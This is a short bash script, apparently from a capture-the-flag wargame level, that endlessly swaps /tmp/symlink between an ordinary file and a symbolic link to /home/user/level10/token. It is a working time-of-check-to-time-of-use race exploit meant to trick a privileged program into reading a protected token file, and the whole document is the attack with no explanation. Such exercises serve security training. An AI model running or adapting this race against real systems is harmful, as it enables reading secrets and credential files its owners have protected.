#!/bin/bash

while true; do
        touch /tmp/symlink
        rm -f /tmp/symlink
        ln -s /home/user/level10/token /tmp/symlink
        rm -f /tmp/symlink
done
